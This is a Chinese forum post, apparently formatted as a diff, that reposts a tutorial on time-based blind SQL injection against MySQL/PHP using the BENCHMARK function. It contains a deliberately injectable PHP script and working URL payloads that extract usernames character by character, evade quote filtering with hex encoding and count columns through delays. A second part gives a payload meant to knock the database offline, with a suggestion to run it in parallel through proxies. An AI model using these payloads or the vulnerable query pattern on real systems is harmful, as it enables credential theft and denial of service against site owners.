@@ -1,0 +1,149 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+注入点通过BENCHMARK函数延迟爆路径！
+D8888D主贴内容-------------------------------------------------------
+刚发了个帖子，主要没理解MYSQL那个BENCHMARK函数！看了黑哥的这文章，BENCHMARK函数的进阶利用可以造成服务器的负载问题...
+第一部
+
+利用时间推延进行注射---BENCHMARK函数在注射中的利用 
+
+一.前言/思路
+
+　　如果你看了angel的《SQL Injection with MySQL》一文，你有会发现一般的mysql+php的注射都是通过返回错误信息，和union联合查询替换原来查询语句中的字段而直接输出敏感信息，但是有的时候，主机设置为不显示错误信息：display_errors = Off 而且有的代码中sql查询后只是简单的对查询结果进行判断，而不要求输出查询结果，我们用上面的办法注射将一无所获。我们可以采用时间推延来进行判断注射了。
+
+　　本技术的主要思路：通过在构造的语句用加入执行时间推延的函数，如果我们提交的判断是正确的，那么mysql查询时间就出现推延，如果提交的判断是正确，将不会执行时间推延的函数，查询语句将不会出现推延。这样我们就可以进行判断注射。
+
+二.关于BENCHMARK函数
+
+　　在MySQL参考手册里可以看到如下描叙： 
+
+
+--------------------------------------------------------------------------------
+
+BENCHMARK(count,expr) 
+BENCHMARK()函数重复countTimes次执行表达式expr，它可以用于计时MySQL处理表达式有多快。结果值总是0。意欲用于mysql客户，它报告查询的执行时间。 
+mysql> select BENCHMARK(1000000,encode("hello","goodbye")); 
++----------------------------------------------+ 
+| BENCHMARK(1000000,encode("hello","goodbye")) | 
++----------------------------------------------+ 
+| 0 | 
++----------------------------------------------+ 
+1 row in set (4.74 sec) 
+
+报告的时间是客户端的经过时间，不是在服务器端的CPU时间。执行BENCHMARK()若干次可能是明智的，并且注意服务器机器的负载有多重来解释结果。
+
+
+--------------------------------------------------------------------------------
+
+　　只要我们把参数count 设置大点，那么那执行的时间就会变长。下面我们看看在mysql里执行的效果： 
+
+mysql> select md5( 'test' ); 
++----------------------------------+ 
+| md5( 'test' ) | 
++----------------------------------+ 
+| 098f6bcd4621d373cade4e832627b4f6 | 
++----------------------------------+ 
+1 row in set (0.00 sec) 〈-----------执行时间为0.00 sec 
+
+mysql> select benchmark( 500000, md5( 'test' ) ); 
++------------------------------------+ 
+| benchmark( 500000, md5( 'test' ) ) | 
++------------------------------------+ 
+| 0 | 
++------------------------------------+ 
+1 row in set (6.55 sec) 〈------------执行时间为6.55 sec
+
+
+　　由此可以看出使用benchmark执行500000次的时间明显比正常执行时间延长了。 
+
+三.具体例子
+
+　　首先我们看个简单的php代码：
+
+< ?php 
+$servername = "localhost"; 
+$dbusername = "root"; 
+$dbpassword = ""; 
+$dbname = "injection"; 
+
+mysql_connect($servername,$dbusername,$dbpassword) or die ("数据库连接失败"); 
+
+$sql = "SELECT * FROM article WHERE articleid=$id"; 
+$result = mysql_db_query($dbname,$sql); 
+$row = mysql_fetch_array($result); 
+
+if (!$row) 
+{ 
+exit; 
+} 
+?>
+
+
+　　数据库injection结构和内容如下：
+
+# 数据库 : `injection` 
+# 
+
+# -------------------------------------------------------- 
+
+# 
+# 表的结构 `article` 
+# 
+
+CREATE TABLE `article` ( 
+`articleid` int(11) NOT NULL auto_increment, 
+`title` varchar(100) NOT NULL default '', 
+`content` text NOT NULL, 
+PRIMARY KEY (`articleid`) 
+) TYPE=MyISAM AUTO_INCREMENT=3 ; 
+
+# 
+# 导出表中的数据 `article` 
+# 
+
+INSERT INTO `article` VALUES (1, '我是一个不爱读书的孩子', '中国的教育制度真是他妈的落后！如果我当教育部长。我要把所有老师都解雇！操～'); 
+INSERT INTO `article` VALUES (2, '我恨死你', '我恨死你了，你是什么东西啊'); 
+
+# -------------------------------------------------------- 
+
+# 
+# 表的结构 `user` 
+# 
+
+CREATE TABLE `user` ( 
+`userid` int(11) NOT NULL auto_increment, 
+`username` varchar(20) NOT NULL default '', 
+`password` varchar(20) NOT NULL default '', 
+PRIMARY KEY (`userid`) 
+) TYPE=MyISAM AUTO_INCREMENT=3 ; 
+
+# 
+# 导出表中的数据 `user` 
+# 
+
+INSERT INTO `user` VALUES (1, 'angel', 'mypass'); 
+INSERT INTO `user` VALUES (2, '4ngel', 'mypass2');
+
+
+　　代码只是对查询结果进行简单的判断是否存在，假设我们已经设置display_errors=Off。我们这里就没办法利用union select的替换直接输出敏感信息(ps:这里不是说我们不利用union，因为在mysql中不支持子查询)或通过错误消息返回不同来判断注射了。我们利用union联合查询插入BENCHMARK函数语句来进行判断注射：
+
+id=1 union select 1,benchmark(500000,md5('test')),1 from user where userid=1 and ord(substring(username,1,1))=97 /*
+
+
+　　上面语句可以猜userid为1的用户名的第一位字母的ascii码值是是否为97，如果是97，上面的查询将由于benchmark作用而延时。如果不为97，将不回出现延时，这样我们最终可以猜出管理员的用户名和密码了。 大家注意，这里有一个小技巧：在benchmark(500000,md5('test'))中我们使用了'号， 这样是很危险的，因为管理员随便设置下 就可以过滤使注射失败，我们这里test可以是用其他进制表示，如16进制。最终构造如下：
+
+[url=http://127.0.0.1/test/test/show.php?id=1%20union%20select%201]链接标记http://127.0.0.1/test/test/show.php?id=1%20union%20select%201[/url],benchmark(500000,md5(0x41)),1%20from%20user%20where%20userid=1%20and%20ord(substring(username,1,1))=97%20/*
+
+
+　　执行速度很慢，得到userid为1的用户名的第一位字母的ascii码值是是为97。 
+
+　　注意：我们在使用union select事必须知道原来语句查询表里的字段数，以往我们是根据错误消息来判断，我们在union select 1,1,1我们不停的增加1 如果字段数正确将正常返回不会出现错误，而现在不可以使用这个方法了，那我们可以利用benchmark(),我们这样构造 union select benchmark(500000,md5(0x41)) 1,1 我们在增加1的，当字段数正确时就回执行benchmark()出现延时，这样我们就可以判断字段数了。 
+
+第二部
+
+利用BENCHMARK函数进行ddos攻击 
+
+　　其实思路很简单：在BENCHMARK(count,expr) 中 我们只要设置count 就是执行次数足够大的话，就可以造成dos攻击了，如果我们用代理或其他同时提交，就是ddos攻击，估计数据库很快就会挂了。不过前提还是要求可以注射。语句：
+
+[url=http://127.0.0.1/test/test/show.php?id=1%20union%20select%201]链接标记http://127.0.0.1/test/test/show.php?id=1%20union%20select%201[/url],1,benchmark(99999999,md5(0x41))
